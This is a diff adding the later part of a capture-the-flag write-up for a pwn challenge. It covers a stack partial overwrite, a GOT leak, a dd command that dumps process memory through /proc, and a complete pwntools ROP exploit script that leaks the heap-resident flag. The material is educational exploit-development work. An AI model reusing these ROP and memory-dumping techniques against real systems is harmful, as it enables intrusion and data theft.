@@ -360,5 +360,330 @@ define print_mem_t
 end
 ```
 
-With leaks gotten, we can now advance with how to gain code execution.
+With leaks gotten, we can now advance with how to gain code execution (or so i thought 😂).
 
+> I'll show you what I ended up doing to get code execution.. although it turned out that, we instead needed to leak the flag from the heap
+{: .prompt-tip }
+
+To get `RIP` control, we need to perform a partial overwrite of `mem->data` so it eventually points toward the return address of `remember`.
+
+This is where things started to get messy for me, I didn't realize how the stack layout could be in practice, especially with alignment and shifting addresses (that cost me a good amount of time...my goodness!).
+
+Sometimes the distance between the stack frame of `main` (where the struct lives) and `remember` would vary slightly, and even worse, `&mem->data` after increments wouldn't always end up being in the same address range.
+
+In my opinion, it's best to just look at the layout of the stack on each run in memory to understand what I'm saying..
+
+Anyways it's not a very reliable exploit but I added checks to make sure the constraints are satisfied before proceeding to the final exploit stage.
+
+> Classic spray-and-pray literally! 😂
+{: .prompt-tip }
+
+One thing is that we can only reliably overwrite two QWORDs (16 bytes) at the return address, so I ended up using a stack pivot gadget that performs:
+
+```c
+"add rsp, 0x60",
+"pop rbx",
+"pop r14",
+"pop rbp",
+"ret"
+```
+
+This was mainly because of the overwrite limitation (obviously, hello?? 😏), so instead of trying to build a full ROP chain at the original return address, I pivoted the stack further down.
+
+I didn't want the ROP chain getting clobbered on the stack mid-execution, so I went with that stack pivot gadget.
+
+With that we're able to call `system('/bin/sh')` thereby getting a shell.
+
+#### Arbitrary memory read ftw!
+
+Getting the leak was actually pretty clean. Since I already had a pointer into the `ELF` section, that effectively gave me the base address.
+
+For libc, the obvious target was the `GOT`.
+
+I ended up using the stack corruption to overwrite `rbp-0x8` of the `loop` function to a fake `mem_t` structure (which resides in the GOT). 
+
+```python
+payload = build_stage_payload(
+    loop_mem_t,
+    p64(exe.address + 0x3f50)
+)
+
+reset()
+remember(-128, payload)
+
+io.send(b"B")
+data = io.recv(0x3d78)
+chunks = [
+    hex(u64(data[i:i+8].ljust(8, b"\x00")))
+    for i in range(0, len(data), 8)
+]
+
+print(chunks)
+```
+
+Remember that the program prints output based on `mem->count`, so I had to misalign the `GOT` in a way that `mem->count` effectively becomes `addr >> 40`.
+
+From there, I used [libc.rip](https://libc.rip/) to identify the exact libc version running on the remote instance, and then proceeded to patch my local binary.
+
+![libc_one](libc_one.png)
+![libc](libc.png)
+
+#### Where the heck is the flag?
+
+It turned out the flag was actually placed on the heap during the service setup.
+
+After getting a shell, I noticed the socat service was being spawned via a `run.sh` script.
+
+![shell_one](shell_one.png)
+![shell_two](shell_two.png)
+
+> I'll be honest here, I got frustrated for hours trying to do privilege escalation (I even tried to use copy-fail but the host doesn't allow outbound connection. It was really a pain 😭 - [@McSam](https://themcsam.github.io/) can attest my suffering on this)
+{: .prompt-tip }
+
+Moving on, the next thing was to dump the heap contents, it turns out that the heap on the remote instance actually isn't at the same offset as the local one (got it with some bit of fuzzing)..
+
+Btw, I tried to cheese the challenge by dumping the heap using `dd` since I could access the `/proc/${PID}/maps` but `ptrace_scope` was disabled 🥲.
+
+```bash
+dd if=/proc/${PID}/mem of=/tmp/dump.bin bs=1 skip=$((0x55678e7c9000)) count=$((0x55678e7ea000 - 0x55678e7c9000)) status=progress
+```
+
+Well, I ended up going back to ROP. To stay on the safe side with all the stack weirdness, I used a `gets()` call to get an unbounded write, which let me further corrupt the return address and build a proper chain to dump the heap contents - smart I'd say 😏
+
+I was so tired I ended up doing a full ROP with the following end goal:
+- retrieved `top_chunk` from `main_arena.top`
+- call `write(1, top_chunk-offset_to_base, 0x2100)`
+
+It would have been easier to make a ROP chain to just `mprotect()` the `bss`, `read()` to it and jump to it xD
+
+> An issue that occurred with `gets()` was that the `pop rsi` gadget contained a newline character which made the call to `gets` stop. I didn't realize on time and almost went insane.. but the fix was to use a varient of it and assert the payload doesn't contain `\n`
+
+Well, that's all 😎
+
+Here's my final solve script:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('memento_patched')
+libc = ELF("./libc6_2.39-0ubuntu8.7_amd64.so")
+
+context.terminal = ['gnome-terminal', '--maximize', '-e']
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+source mem.gdb
+brva 0x1252
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def remember(count, data):
+    io.send(b"A")
+    io.send(p8(count, signed=True))
+    io.send(data)
+
+def recall():
+    io.send(b"B")
+
+    io.recvuntil(b"A" * 24)
+    data = io.recv(0xff)
+
+    return [
+        u64(data[i:i+8].ljust(8, b"\x00"))
+        for i in range(0, len(data), 8)
+    ]
+
+def reset():
+    io.send(b"C")
+
+def build_stage_payload(target, chain, size=128):
+    payload  = b"B" * 24
+    payload += p8(0x0)
+    payload += p8(0) * 7
+    payload += p8((target - 1) & 0xff)
+    payload += chain
+
+    return payload.ljust(size, b"A")
+
+def solve():
+
+    io.send(b"HTB{AAAAAAAA}")
+
+    remember(24, b"A" * 24)
+    remember(1, p8(0xff - 1))
+
+    chunks = recall()
+    libc_leak = chunks[4]
+    stack_leak = chunks[3]
+    exe.address = chunks[-1] - exe.sym["main"]
+    libc.address = libc_leak - 0x2a1ca
+
+    info("libc base: %#x", libc.address)
+    info("elf base: %#x", exe.address)
+
+    return_addr = stack_leak - 0x118
+    mem_t_obj   = stack_leak - 0xd0
+    rop_stack   = stack_leak - 0x98
+    loop_mem_t  = stack_leak - 0x108
+    
+    info(f"return addr : {hex(return_addr)}")
+    info(f"mem_t object: {hex(mem_t_obj)}")
+    info(f"rop stack   : {hex(rop_stack)}")
+    info(f"loop mem_t  : {hex(loop_mem_t)}")
+
+    rop = ROP(libc)
+
+    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
+    pop_rdx = libc.address + 0x144a1a # pop rdx ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
+
+    pivot = rop.find_gadget([
+        "add rsp, 0x60",
+        "pop rbx",
+        "pop r14",
+        "pop rbp",
+        "ret"
+    ])[0]
+
+    info(f"pivot gadget: {hex(pivot)}")
+
+    stage1_chain = flat(
+        pop_rdi,
+        mem_t_obj + 0x50,
+    )
+
+    payload = build_stage_payload(
+        rop_stack,
+        stage1_chain
+    )
+
+    reset()
+    remember(-128, payload)
+
+    stage2_chain = flat(
+        libc.sym["gets"],
+        mem_t_obj + 0x50
+    )
+
+    payload = build_stage_payload(
+        rop_stack + 0x10,
+        stage2_chain
+    )
+
+    reset()
+    remember(-128, payload)
+
+    # hope for stack to be alligned lmao 
+    data_ptr_nibble = ((mem_t_obj + 0x20) & 0xf00) >> 8
+    current_nibble  = (mem_t_obj & 0xf00) >> 8
+
+    if current_nibble != data_ptr_nibble:
+        warning("[1] stack alignment failed")
+        io.close()
+
+    if (return_addr  & ~0xff) != (mem_t_obj & ~0xff):
+        warning("[2] stack alignment failed")
+        io.close()
+
+    payload = build_stage_payload(
+        return_addr,
+        p64(pivot)
+    )
+
+    reset()
+    remember(-128, payload)
+
+    pop_rdi = libc.address + 0x10f78b # pop rdi ; ret
+    pop_rdx = libc.address + 0xab8a1 # pop rdx ; or byte ptr [rcx - 0xa], al ; ret
+    pop_rcx = libc.address + 0xa877e # pop rcx ; ret
+    pop_rsi_r15 = libc.address + 0x10f789 # pop rsi ; pop r15 ; ret
+    pop_rbp = libc.address + 0x28a91 # pop rbp ; ret
+    add_rdx_rdi = libc.address + 0x18e027 # add rdx, rdi ; lea rax, [rdx + rax*4] ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
+    read_write_gadget = libc.address + 0xbf450 # mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
+    mov_rax_rdi = libc.address + 0x96ca5 # mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
+    mov_rsi_rax = libc.address + 0x183a82 # mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
+    bss = exe.address + 0x4510
+    size = 0x2100
+    
+    payload = flat(
+        [
+            pop_rdi,
+            bss,
+            pop_rsi_r15,
+            libc.address + 0x203b20,
+            0x0,
+            read_write_gadget,
+            pop_rcx,
+            0x0,
+            pop_rdi,
+            -size,
+            add_rdx_rdi,
+            pop_rdi,
+            bss+0x100,
+            read_write_gadget+3,
+            pop_rcx,
+            bss+0x10,
+            pop_rdx,
+            bss+0x50,
+            pop_rdi,
+            bss+0x100,
+            mov_rax_rdi,
+            pop_rcx,
+            0x0,
+            mov_rsi_rax,
+            pop_rdi,
+            1,
+            pop_rcx,
+            bss+0x10,
+            pop_rdx,
+            size,
+            libc.sym["write"],
+        ]
+    )
+    
+    # print(hexdump(payload))
+    assert b"\n" not in payload
+
+    io.sendline(payload)
+
+    io.interactive()
+
+
+def main():      
+    init()
+    solve()
+            
+            
+if __name__ == '__main__':
+    main()
+```
+
+Running it works:
+
+![flag](flag.png)
+
+
+#### FLAG
+
+```
+HTB{n0w_wh3re_w4s_1}
+```
